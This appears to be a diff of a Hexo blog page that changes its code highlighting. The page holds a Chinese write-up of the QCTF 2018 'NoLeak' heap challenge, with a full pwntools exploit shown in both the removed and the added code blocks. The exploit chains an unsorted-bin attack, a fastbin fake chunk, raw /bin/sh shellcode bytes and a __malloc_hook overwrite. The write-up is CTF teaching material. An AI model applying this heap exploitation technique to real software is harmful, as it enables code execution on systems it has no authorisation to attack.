@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="QCTF 2018NoLeak wp​    这道题是一道unsorted bin attack + fastbin attck的题。​    拿到题扔ida一看发现无printf函数无法泄露地址，所以就无法构造system指令执行，checksec看下发现未开nx保护，此时基本可以确定是写shellcode(堆题写shellcode之前没做过)。​">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -317,93 +317,11 @@
     <div class="post-body" itemprop="articleBody">
         <h1 id="QCTF-2018"><a href="#QCTF-2018" class="headerlink" title="QCTF 2018"></a>QCTF 2018</h1><h2 id="NoLeak-wp"><a href="#NoLeak-wp" class="headerlink" title="NoLeak wp"></a>NoLeak wp</h2><p>​    这道题是一道unsorted bin attack + fastbin attck的题。<br>​    拿到题扔ida一看发现无printf函数无法泄露地址，所以就无法构造system指令执行，checksec看下发现未开nx保护，此时基本可以确定是写shellcode(堆题写shellcode之前没做过)。<br>​    <a id="more"></a><br>审下函数发现edit函数检查不全面导致可以修改已经free的chunk的两个指针fd和bk，这里可以利用        unsorted bin的特性，修改free后的unsorted bin中的chunk的fd和bk，使修改的target地址指向unsortedbin中的链表头，由于其载入内存的基地址是一样的，且libc后三个字节是固定的，所以可以通过libc-database识别libc版本并得到函数的offset（题目给了libc库），然后修改target指向的链表头地址的后三个字节，使其指向想要覆盖的got表地址。但是单靠unsortedbin无法直接进行任意地址读写，这里还需要用到fastbin attack（unsorted bin这里可以理解为起到了leak的作用) 构造fake chunk进行任意地址写。</p>
 <p>​    攻击者可以通过修改fastbin中freechunk的fd，使其指向一个fake chunk，然后进行一次malloc，第二次malloc就能在指定位置创建chunk了，也就是可以向指定地址写数据。这里需要注意的是当malloc fake chunk的时候 ，*(&amp;(fake chunk)+8) 也就是fake chunk的size大小必须要属于fastbin对应的大小，否则在进行分配的时候glibc会报错。当成功malloc fake chunk后，我们已经能够向指定位置写入数据，这里我们向bss段保存chunk user data段指针的buff写入包含buff自身地址信息的数据，这样利用程序中的update函数我们就能向bss段写入shellcode，然后我们就可以通过覆写got表(__malloc_hook)为指向shellcode的地址来最终get shell。<br>exp如下:</p>
-<pre><code>from pwn import *
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./NoLeak'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="keyword">create</span>(size,data):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(str(data))</span><br><span class="line"></span><br><span class="line">def <span class="keyword">delete</span>(<span class="keyword">index</span>):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(str(<span class="keyword">index</span>))</span><br><span class="line"></span><br><span class="line">def <span class="keyword">update</span>(<span class="keyword">index</span>,size,data):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(str(<span class="keyword">index</span>))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(str(data))</span><br><span class="line"></span><br><span class="line">def <span class="keyword">exit</span>():</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">magic=<span class="number">0x0000000000601040</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x60</span>,<span class="string">'0000'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x80</span>,<span class="string">'1111'</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x80</span>,<span class="string">'2222'</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span>(<span class="number">1</span>,<span class="number">0x10</span>,p64(magic+<span class="number">0x20</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x80</span>,<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span>(<span class="number">0</span>,<span class="number">0x8</span>,p64(<span class="number">0x60106d</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x60</span>,<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x60</span>,<span class="string">'aaa'</span>+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x601080</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span>(<span class="number">8</span>,<span class="number">1</span>,p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span>(<span class="number">6</span>,<span class="number">8</span>,p64(<span class="number">0x601080</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span>(<span class="number">9</span>,len(shellcode),shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)
 
-p=process(&#39;./NoLeak&#39;)
 
-def create(size,data):
-
-    p.recvuntil(&#39;Your choice :&#39;)
-
-    p.sendline(&#39;1&#39;)
-
-    p.recvuntil(&#39;Size: &#39;)
-
-    p.sendline(str(size))
-
-    p.recvuntil(&#39;Data: &#39;)
-
-    p.sendline(str(data))
-
-def delete(index):
-
-    p.recvuntil(&#39;Your choice :&#39;)
-
-    p.sendline(&#39;2&#39;)
-
-    p.recvuntil(&#39;Index: &#39;)
-
-    p.sendline(str(index))
-
-def update(index,size,data):
-
-    p.recvuntil(&#39;Your choice :&#39;)
-
-    p.sendline(&#39;3&#39;)
-
-    p.recvuntil(&#39;Index: &#39;)
-
-    p.sendline(str(index))
-
-    p.recvuntil(&#39;Size: &#39;)
-
-    p.sendline(str(size))
-
-    p.recvuntil(&#39;Data: &#39;)
-
-    p.sendline(str(data))
-
-def exit():
-
-    p.recvuntil(&#39;Your choice :&#39;)
-
-    p.sendline(&#39;4&#39;)
-
-magic=0x0000000000601040
-
-shellcode=asm(shellcraft.sh())
-
-shellcode=&#39;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#39;
-
-create(0x60,&#39;0000&#39;)
-
-create(0x80,&#39;1111&#39;) 
-
-create(0x80,&#39;2222&#39;) 
-
-delete(1)
-
-update(1,0x10,p64(magic+0x20)*2)
-
-create(0x80,&#39;3333&#39;)
-
-delete(0)
-
-update(0,0x8,p64(0x60106d))
-
-create(0x60,&#39;3333&#39;)
-
-create(0x60,&#39;aaa&#39;+p64(0x601070)+p64(0x601080))
-
-update(8,1,p64(0x10))
-
-update(6,8,p64(0x601080))
-
-update(9,len(shellcode),shellcode)
-
-p.interactive()</code></pre><p>​    总结一下这题思路其实很明确，ida中看到没开泄露地址的函数加上nx保护没开所以想到写shellcode，然后想到got表覆写，由于不能直接泄露地址想到可以利用unsorted bin的链表头指针间接泄露基址，找到libc版本库确定要覆盖函数的低三字节，利用fastbin fake chunk attack向堆指针buff区写入一个包含buff自身信息的指针，然后就能向低三字节写入查找到的地址，之后利用update函数在bss段buff区后面写入shellcode，最后再利用update函数向got表写入指向shellcode的指针，当调用malloc函数时由于malloc-hook已经被覆盖，所以能直接跳去执行shellcode。</p>
+<p>​    总结一下这题思路其实很明确，ida中看到没开泄露地址的函数加上nx保护没开所以想到写shellcode，然后想到got表覆写，由于不能直接泄露地址想到可以利用unsorted bin的链表头指针间接泄露基址，找到libc版本库确定要覆盖函数的低三字节，利用fastbin fake chunk attack向堆指针buff区写入一个包含buff自身信息的指针，然后就能向低三字节写入查找到的地址，之后利用update函数在bss段buff区后面写入shellcode，最后再利用update函数向got表写入指向shellcode的指针，当调用malloc函数时由于malloc-hook已经被覆盖，所以能直接跳去执行shellcode。</p>
 
     </div>
 
@@ -509,8 +427,6 @@ p.interactive()</code></pre><p>​    总结一下这题思路其实很明确，
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
